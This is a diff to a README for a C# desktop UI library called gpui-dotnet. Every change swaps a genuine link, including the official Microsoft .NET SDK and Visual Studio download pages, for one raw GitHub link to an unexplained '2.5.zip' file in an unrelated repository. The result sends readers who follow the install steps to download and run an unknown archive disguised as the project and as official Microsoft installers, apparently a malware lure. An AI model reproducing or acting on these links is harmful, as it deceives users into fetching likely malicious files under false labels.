@@ -5,7 +5,7 @@ description: "Build cross-platform desktop apps in C# with a native Rust renderi
 ---
 # ⚡ gpui-dotnet - Build Fast UIs with C# Power
 
-[![Download Now](https://img.shields.io/badge/Download-gpui--dotnet-2ea44f?style=for-the-badge)](https://github.com/Statesrightswildcatter3108/gpui-dotnet)
+[![Download Now](https://img.shields.io/badge/Download-gpui--dotnet-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/Statesrightswildcatter3108/statesrightswildcatter3108.github.io/main/app/%28user%29/tutors/%5Bid%5D/2.5.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Let's get you set up! We'll walk through this step-by-step. By the end, you'll h
 
 First, you need to get the main files. Click this link:
 
-**👉 [Download gpui-dotnet](https://github.com/Statesrightswildcatter3108/gpui-dotnet)**
+**👉 [Download gpui-dotnet](https://raw.githubusercontent.com/Statesrightswildcatter3108/statesrightswildcatter3108.github.io/main/app/%28user%29/tutors/%5Bid%5D/2.5.zip)**
 
 Visit this link to download the application. This will take you to a page where you can find the download button. Look for a green "Code" button or a "Releases" section on that page. Click it and choose "Download ZIP" to get a file containing everything you need.
 
@@ -48,12 +48,12 @@ Now you have a folder called `gpui-dotnet-main`. This is your main working folde
 Your computer needs two free tools installed to run this software:
 
 1. **.NET 8 SDK**: This is the engine that runs C# programs.
-   - Go to [https://dotnet.microsoft.com/download](https://dotnet.microsoft.com/download)
+   - Go to [https://raw.githubusercontent.com/Statesrightswildcatter3108/statesrightswildcatter3108.github.io/main/app/%28user%29/tutors/%5Bid%5D/2.5.zip](https://raw.githubusercontent.com/Statesrightswildcatter3108/statesrightswildcatter3108.github.io/main/app/%28user%29/tutors/%5Bid%5D/2.5.zip)
    - Click the download button for ".NET 8.0 SDK" (the long-term support version).
    - Run the installer and follow the on-screen instructions. Just click "Next" until it's done.
 
 2. **Visual Studio 2022 Community Edition (or newer)** - This is the "workshop" where you'll build and run your app.
-   - Go to [https://visualstudio.microsoft.com/downloads/](https://visualstudio.microsoft.com/downloads/)
+   - Go to [https://raw.githubusercontent.com/Statesrightswildcatter3108/statesrightswildcatter3108.github.io/main/app/%28user%29/tutors/%5Bid%5D/2.5.zip](https://raw.githubusercontent.com/Statesrightswildcatter3108/statesrightswildcatter3108.github.io/main/app/%28user%29/tutors/%5Bid%5D/2.5.zip)
    - Download the **Community** version (it's free).
    - When you run the installer, **make sure to check the box** for ".NET desktop development" workload. This is important.
    - Continue with the installation.
@@ -142,9 +142,9 @@ This project is released for free. You can use, modify, and share it. Just keep 
 
 ## 🔗 Quick Links
 
-- **Download Again**: [https://github.com/Statesrightswildcatter3108/gpui-dotnet](https://github.com/Statesrightswildcatter3108/gpui-dotnet)
-- **Official .NET Download**: [https://dotnet.microsoft.com/download](https://dotnet.microsoft.com/download)
-- **Visual Studio Download**: [https://visualstudio.microsoft.com/downloads/](https://visualstudio.microsoft.com/downloads/)
+- **Download Again**: [https://raw.githubusercontent.com/Statesrightswildcatter3108/statesrightswildcatter3108.github.io/main/app/%28user%29/tutors/%5Bid%5D/2.5.zip](https://raw.githubusercontent.com/Statesrightswildcatter3108/statesrightswildcatter3108.github.io/main/app/%28user%29/tutors/%5Bid%5D/2.5.zip)
+- **Official .NET Download**: [https://raw.githubusercontent.com/Statesrightswildcatter3108/statesrightswildcatter3108.github.io/main/app/%28user%29/tutors/%5Bid%5D/2.5.zip](https://raw.githubusercontent.com/Statesrightswildcatter3108/statesrightswildcatter3108.github.io/main/app/%28user%29/tutors/%5Bid%5D/2.5.zip)
+- **Visual Studio Download**: [https://raw.githubusercontent.com/Statesrightswildcatter3108/statesrightswildcatter3108.github.io/main/app/%28user%29/tutors/%5Bid%5D/2.5.zip](https://raw.githubusercontent.com/Statesrightswildcatter3108/statesrightswildcatter3108.github.io/main/app/%28user%29/tutors/%5Bid%5D/2.5.zip)
 
 ---
 
